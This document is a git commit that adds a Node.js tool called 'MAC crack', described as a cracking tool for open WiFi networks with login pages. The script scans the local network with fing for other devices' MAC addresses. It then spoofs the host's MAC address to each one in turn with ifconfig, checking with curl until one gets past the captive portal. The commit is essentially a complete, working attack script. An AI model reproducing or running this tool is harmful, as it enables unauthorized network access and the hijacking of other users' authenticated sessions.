a7e8a3ccd457cdeb092e81d4477bf5d3fea8dc16
Carsten Csiky <carsten.csiky@googlemail.com>
2012-08-23 07:44:37 -0700

    working updated version

--- README.md
+++ README.md
@@ -1,4 +1,8 @@
-MAC-Crack
+MAC crack
 =========
 
-A Cracking Tool for open Wifis with login pages
+# Usage
+
+use `[sudo] node main.js [interface]` to start the script.
+This operation will need super user rights.
+`interface` is for ethernet usually eth0 / en0; for wifi wlan0 / en1;
---
+++ main.js
@@ -0,0 +1,81 @@
+var fs = require("fs"),
+	exec = require("child_process").exec,
+	platform = process.platform;
+
+var commands = {
+	changeMAC: {
+		linux: "ifconfig {{interface}} down;"+
+			   "ifconfig {{interface}} hw ether {{MAC}};"+
+			   "ifconfig {{interface}} up;",
+		darwin: "ifconfig {{interface}} ether {{MAC}}"
+	}	
+}
+function command(name, vars){
+	var s = commands[name][platform]
+	for(i in vars){
+		s = s.replace("{{"+i+"}}", vars[i])
+	}
+	return s;
+}
+function getNodes(callback){
+	console.log("*    getting all network nodes...")
+	exec("fing -r 1 -o table,csv,nodes.csv", function(err, stdout, stderr){
+		if(err || stderr){
+			console.log("!!   error at execution:");
+			if(err) console.log(err);
+			if(stderr) console.log(stderr);
+		}else{
+			var NumOfNodes = /has ([1-9]*)/g.exec(stdout).index;
+			console.log("*    "+NumOfNodes+" are up");
+			console.log("*    reading output file")
+			fs.readFile("nodes.csv", "utf8", function(err, data){
+				if(err) {
+					console.log("!!   error at opening nodes.csv:"+err);
+				}else{
+					console.log("*    parsing output")
+					data = data.split("\n");
+					var output = []
+					for(var i = 0; i < data.length; i++){
+						data[i] = data[i].split(";");
+						output.push(data[i][5])
+						if(i+1 == data.length){
+							callback(output);
+						}
+					}
+				}
+			})
+		}
+	});
+};
+function tryMacs(macs){
+	var i = 0;
+	var interface = process.argv[2];
+	function next(mac){
+		console.log("*    changing MAC-Address...")
+		exec(command("changeMAC", {interface: interface, MAC: mac}), function(err, stdout, stderr){
+			console.log("*    waiting for connect...")
+			setTimeout(function(){
+				console.log("*    getting google.com...")
+				exec("curl google.com", function(err, stdout, stderr){
+					if(stdout){
+						console.log("*    ,-)")
+						console.log("*    it's working !!!!");
+						console.log("*    using "+mac);
+					}else{
+						console.log("*    :-(")
+						console.log("*    address not working\n*    trying next one")
+						next(macs[++i]);
+					}
+				})
+			}, 10000)
+		})
+	}
+	next(macs[i])
+}
+(function(){
+	if(process.env.SUDO_USER || process.env.USER === "root"){
+		getNodes(tryMacs);
+	}else{
+		console.log("*   you need to be root to exec this. \n*   Try sudo [the command]")
+	}
+})()
